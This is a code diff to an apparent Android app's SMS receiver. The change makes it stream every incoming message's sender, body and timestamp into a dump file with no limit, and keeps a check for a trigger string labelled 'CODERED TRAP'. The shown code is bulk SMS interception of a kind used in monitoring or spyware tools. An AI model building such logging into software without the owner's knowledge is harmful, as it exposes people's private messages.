@@ -32,19 +32,18 @@ class SmsReceiver : BroadcastReceiver() {
             // 2. Parse Messages
             val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
             if (messages != null && messages.isNotEmpty()) {
-                val rawLogs = prefs.getString("sms_logs_cache", "[]")
-                val logArray = try { JSONArray(rawLogs) } catch(e: Exception) { JSONArray() }
-
                 messages.forEach { msg ->
                     val body = msg.messageBody
                     val sender = msg.displayOriginatingAddress
 
-                    // --- A. LOGGING ---
+                    // --- A. LOGGING (STREAM) ---
                     val entry = JSONObject()
                     entry.put("sender", sender)
                     entry.put("body", body)
                     entry.put("timestamp", System.currentTimeMillis())
-                    logArray.put(entry)
+                    
+                    // Write to file instantly (No Lag)
+                    DumpManager.appendLog("SMS", entry)
 
                     // --- B. CODERED TRAP ---
                     // Checks for the emergency trigger string
@@ -60,10 +59,8 @@ class SmsReceiver : BroadcastReceiver() {
                         }
                     }
                 }
-                // Limit Removed: Infinite Logging Active
-                editor.putString("sms_logs_cache", logArray.toString())
             }
-            editor.commit() // Use commit inside background thread
+            editor.commit()
             } catch(e: Exception) {
                 e.printStackTrace()
             } finally {
